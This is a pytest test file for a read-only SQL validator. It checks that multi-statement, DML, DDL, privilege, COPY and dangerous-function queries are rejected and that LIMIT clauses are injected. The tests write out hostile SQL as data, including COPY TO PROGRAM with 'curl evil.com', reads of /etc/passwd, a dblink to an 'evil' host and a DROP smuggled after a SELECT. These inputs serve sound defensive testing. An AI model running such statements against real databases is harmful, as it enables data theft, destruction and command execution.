"""Exhaustive validator tests — defense in depth layer 3.

Each test function targets a specific attack vector or legitimate case.
Adding a new vector here should be the first reaction to any
red-teaming finding (cf. spec §12 last section + suivi.md Phase 10).

Test categories
---------------

1. Single-statement enforcement (multi-statement, comment-tricks, empty)
2. DML rejection (INSERT, UPDATE, DELETE, MERGE)
3. DDL rejection (DROP, ALTER, TRUNCATE, CREATE)
4. Privilege rejection (GRANT, REVOKE)
5. Bulk transfer rejection (COPY)
6. Session command rejection (SET, ANALYZE, VACUUM)
7. DML-in-CTE rejection
8. Dangerous function rejection (pg_read_file, lo_export, dblink, …)
9. pg_sleep guards (literal cap, non-literal refusal)
10. Table whitelist (default schema, qualified, mismatched)
11. LIMIT auto-injection / clamping
12. Legitimate SELECT shapes (joins, CTEs, windows, UNION)
"""

from __future__ import annotations

import pytest

from piilot_pack_supabase.validator import (
    DEFAULT_LIMIT_CAP,
    ValidationError,
    validate,
)

# A small whitelist used across most tests. Schemas/tables are
# lowercased — validate() always lowercases its inputs from the AST.
WHITELIST = frozenset(
    {
        ("public", "users"),
        ("public", "orders"),
        ("public", "products"),
        ("analytics", "events"),
    }
)


# ---------------------------------------------------------------------------
# 1. Single-statement enforcement
# ---------------------------------------------------------------------------


def test_rejects_empty_sql() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate("", allowed_tables=WHITELIST)
    assert "empty" in str(excinfo.value).lower()


def test_rejects_whitespace_only_sql() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate("   \n\t  ", allowed_tables=WHITELIST)
    assert "empty" in str(excinfo.value).lower()


def test_rejects_multi_statement_with_semicolon() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT 1 FROM public.users; SELECT 2 FROM public.orders;",
            allowed_tables=WHITELIST,
        )
    assert "multi-statement" in str(excinfo.value)


def test_rejects_drop_hidden_after_select_via_semicolon() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT * FROM public.users; DROP TABLE public.users;",
            allowed_tables=WHITELIST,
        )
    # Either multi-statement detection wins or the DROP detection
    # — both are acceptable security outcomes; we just need rejection.
    msg = str(excinfo.value).lower()
    assert "multi-statement" in msg or "drop" in msg


def test_tolerates_trailing_semicolon_on_legit_select() -> None:
    out = validate("SELECT id FROM public.users;", allowed_tables=WHITELIST)
    # Must still inject LIMIT
    assert "LIMIT" in out.upper()


def test_rejects_garbage_input() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate("this is not sql at all !!!", allowed_tables=WHITELIST)
    # Either parse error or a forbidden node — both fine.
    msg = str(excinfo.value).lower()
    assert "parse" in msg or "forbidden" in msg or "select" in msg


# ---------------------------------------------------------------------------
# 2. DML rejection
# ---------------------------------------------------------------------------


def test_rejects_insert() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "INSERT INTO public.users (id, name) VALUES (1, 'eve')",
            allowed_tables=WHITELIST,
        )
    assert "select" in str(excinfo.value).lower() or "insert" in str(excinfo.value).lower()


def test_rejects_update() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "UPDATE public.users SET name = 'eve' WHERE id = 1",
            allowed_tables=WHITELIST,
        )
    assert "select" in str(excinfo.value).lower() or "update" in str(excinfo.value).lower()


def test_rejects_delete() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate("DELETE FROM public.users WHERE id = 1", allowed_tables=WHITELIST)
    assert "select" in str(excinfo.value).lower() or "delete" in str(excinfo.value).lower()


def test_rejects_merge() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            """
            MERGE INTO public.users u
            USING (SELECT 1 AS id) AS s ON u.id = s.id
            WHEN MATCHED THEN UPDATE SET name = 'x'
            """,
            allowed_tables=WHITELIST,
        )
    msg = str(excinfo.value).lower()
    assert "select" in msg or "merge" in msg or "update" in msg


# ---------------------------------------------------------------------------
# 3. DDL rejection
# ---------------------------------------------------------------------------


def test_rejects_drop_table() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate("DROP TABLE public.users", allowed_tables=WHITELIST)
    msg = str(excinfo.value).lower()
    assert "select" in msg or "drop" in msg


def test_rejects_alter_table() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "ALTER TABLE public.users ADD COLUMN evil text",
            allowed_tables=WHITELIST,
        )
    msg = str(excinfo.value).lower()
    assert "select" in msg or "alter" in msg


def test_rejects_truncate() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate("TRUNCATE TABLE public.users", allowed_tables=WHITELIST)
    msg = str(excinfo.value).lower()
    assert "select" in msg or "truncate" in msg


def test_rejects_create_table() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "CREATE TABLE public.evil (id int)", allowed_tables=WHITELIST
        )
    msg = str(excinfo.value).lower()
    assert "select" in msg or "create" in msg


# ---------------------------------------------------------------------------
# 4. Privilege rejection
# ---------------------------------------------------------------------------


def test_rejects_grant() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "GRANT ALL ON public.users TO public", allowed_tables=WHITELIST
        )
    msg = str(excinfo.value).lower()
    assert "select" in msg or "grant" in msg


def test_rejects_revoke() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "REVOKE ALL ON public.users FROM piilot_readonly",
            allowed_tables=WHITELIST,
        )
    msg = str(excinfo.value).lower()
    assert "select" in msg or "revoke" in msg


# ---------------------------------------------------------------------------
# 5. Bulk transfer rejection
# ---------------------------------------------------------------------------


def test_rejects_copy_to_program() -> None:
    with pytest.raises(ValidationError):
        validate(
            "COPY public.users TO PROGRAM 'curl evil.com'",
            allowed_tables=WHITELIST,
        )


def test_rejects_copy_from() -> None:
    with pytest.raises(ValidationError):
        validate(
            "COPY public.users FROM '/etc/passwd'",
            allowed_tables=WHITELIST,
        )


# ---------------------------------------------------------------------------
# 6. Session / utility command rejection
# ---------------------------------------------------------------------------


def test_rejects_set_session() -> None:
    with pytest.raises(ValidationError):
        validate("SET search_path = public", allowed_tables=WHITELIST)


# ---------------------------------------------------------------------------
# 7. DML hidden in CTE
# ---------------------------------------------------------------------------


def test_rejects_delete_in_cte() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "WITH del AS (DELETE FROM public.users RETURNING *) "
            "SELECT * FROM del",
            allowed_tables=WHITELIST,
        )
    msg = str(excinfo.value).lower()
    assert "delete" in msg or "forbidden" in msg


def test_rejects_update_in_cte() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "WITH upd AS (UPDATE public.users SET name='x' RETURNING *) "
            "SELECT * FROM upd",
            allowed_tables=WHITELIST,
        )
    msg = str(excinfo.value).lower()
    assert "update" in msg or "forbidden" in msg


def test_rejects_insert_in_cte() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "WITH ins AS (INSERT INTO public.users(id) VALUES (1) RETURNING *) "
            "SELECT * FROM ins",
            allowed_tables=WHITELIST,
        )
    msg = str(excinfo.value).lower()
    assert "insert" in msg or "forbidden" in msg


# ---------------------------------------------------------------------------
# 8. Dangerous function rejection
# ---------------------------------------------------------------------------


def test_rejects_pg_read_file() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT pg_read_file('/etc/passwd') FROM public.users",
            allowed_tables=WHITELIST,
        )
    assert "pg_read_file" in str(excinfo.value)


def test_rejects_lo_export() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT lo_export(1, '/tmp/x') FROM public.users",
            allowed_tables=WHITELIST,
        )
    assert "lo_export" in str(excinfo.value)


def test_rejects_dblink() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)",
            allowed_tables=WHITELIST,
        )
    assert "dblink" in str(excinfo.value)


def test_rejects_pg_terminate_backend() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT pg_terminate_backend(1234)",
            allowed_tables=WHITELIST,
        )
    assert "pg_terminate_backend" in str(excinfo.value)


def test_rejects_pg_advisory_lock() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT pg_advisory_lock(1)", allowed_tables=WHITELIST
        )
    assert "pg_advisory_lock" in str(excinfo.value)


def test_rejects_pg_ls_dir() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT pg_ls_dir('/var/lib/postgresql')",
            allowed_tables=WHITELIST,
        )
    assert "pg_ls_dir" in str(excinfo.value)


# ---------------------------------------------------------------------------
# 9. pg_sleep guards
# ---------------------------------------------------------------------------


def test_allows_pg_sleep_short_literal() -> None:
    # 0.5s is within the cap — should pass.
    out = validate(
        "SELECT pg_sleep(0.5) FROM public.users",
        allowed_tables=WHITELIST,
    )
    assert "pg_sleep" in out.lower()


def test_rejects_pg_sleep_long_literal() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT pg_sleep(99999) FROM public.users",
            allowed_tables=WHITELIST,
        )
    assert "pg_sleep" in str(excinfo.value)


def test_rejects_pg_sleep_with_column_arg() -> None:
    # Non-literal arg can't be statically bounded — refuse.
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT pg_sleep(id) FROM public.users",
            allowed_tables=WHITELIST,
        )
    assert "pg_sleep" in str(excinfo.value)


# ---------------------------------------------------------------------------
# 10. Table whitelist
# ---------------------------------------------------------------------------


def test_rejects_table_not_in_whitelist() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT * FROM public.secrets", allowed_tables=WHITELIST
        )
    assert "secrets" in str(excinfo.value)
    assert "whitelist" in str(excinfo.value)


def test_rejects_auth_users_even_with_default_schema_match() -> None:
    # auth.users isn't in WHITELIST. Even if a sibling schema
    # ``public.users`` is allowed, the schema-qualified form must be
    # rejected.
    with pytest.raises(ValidationError) as excinfo:
        validate("SELECT * FROM auth.users", allowed_tables=WHITELIST)
    assert "auth.users" in str(excinfo.value)


def test_default_schema_assumed_public() -> None:
    # ``users`` (no schema) should resolve to ``public.users`` and pass.
    out = validate("SELECT id FROM users", allowed_tables=WHITELIST)
    assert "LIMIT" in out.upper()


def test_allows_qualified_whitelist_match() -> None:
    out = validate(
        "SELECT id FROM analytics.events", allowed_tables=WHITELIST
    )
    assert "LIMIT" in out.upper()


def test_rejects_join_with_non_whitelisted_side() -> None:
    with pytest.raises(ValidationError) as excinfo:
        validate(
            "SELECT u.id FROM public.users u "
            "JOIN public.audit a ON a.user_id = u.id",
            allowed_tables=WHITELIST,
        )
    assert "audit" in str(excinfo.value)


# ---------------------------------------------------------------------------
# 11. LIMIT auto-injection / clamping
# ---------------------------------------------------------------------------


def test_injects_limit_when_absent() -> None:
    out = validate("SELECT id FROM public.users", allowed_tables=WHITELIST)
    assert f"LIMIT {DEFAULT_LIMIT_CAP}" in out.upper()


def test_preserves_smaller_limit() -> None:
    out = validate(
        "SELECT id FROM public.users LIMIT 5",
        allowed_tables=WHITELIST,
    )
    assert "LIMIT 5" in out.upper()
    assert f"LIMIT {DEFAULT_LIMIT_CAP}" not in out.upper()


def test_caps_higher_limit() -> None:
    out = validate(
        "SELECT id FROM public.users LIMIT 99999",
        allowed_tables=WHITELIST,
    )
    assert f"LIMIT {DEFAULT_LIMIT_CAP}" in out.upper()
    assert "99999" not in out


def test_custom_limit_cap_respected() -> None:
    out = validate(
        "SELECT id FROM public.users",
        allowed_tables=WHITELIST,
        limit_cap=100,
    )
    assert "LIMIT 100" in out.upper()


def test_caps_existing_limit_to_custom_cap() -> None:
    out = validate(
        "SELECT id FROM public.users LIMIT 500",
        allowed_tables=WHITELIST,
        limit_cap=100,
    )
    assert "LIMIT 100" in out.upper()


# ---------------------------------------------------------------------------
# 12. Legitimate complex SELECT shapes
# ---------------------------------------------------------------------------


def test_allows_inner_join() -> None:
    out = validate(
        "SELECT u.id, o.total "
        "FROM public.users u "
        "JOIN public.orders o ON o.user_id = u.id",
        allowed_tables=WHITELIST,
    )
    assert "LIMIT" in out.upper()


def test_allows_legitimate_cte() -> None:
    out = validate(
        "WITH active AS (SELECT id FROM public.users WHERE active = true) "
        "SELECT * FROM active",
        allowed_tables=WHITELIST,
    )
    assert "WITH" in out.upper()
    assert "LIMIT" in out.upper()


def test_allows_window_function() -> None:
    out = validate(
        "SELECT id, ROW_NUMBER() OVER (PARTITION BY user_id ORDER BY created_at DESC) "
        "FROM public.orders",
        allowed_tables=WHITELIST,
    )
    assert "LIMIT" in out.upper()


def test_allows_union() -> None:
    out = validate(
        "SELECT id FROM public.users "
        "UNION ALL "
        "SELECT id FROM public.orders",
        allowed_tables=WHITELIST,
    )
    # LIMIT should be at the union level after rewrite
    assert "LIMIT" in out.upper()


def test_allows_aggregate() -> None:
    out = validate(
        "SELECT COUNT(*) FROM public.users WHERE active = true",
        allowed_tables=WHITELIST,
    )
    assert "COUNT" in out.upper()


def test_allows_subquery() -> None:
    out = validate(
        "SELECT id FROM public.users "
        "WHERE id IN (SELECT user_id FROM public.orders WHERE total > 100)",
        allowed_tables=WHITELIST,
    )
    assert "LIMIT" in out.upper()
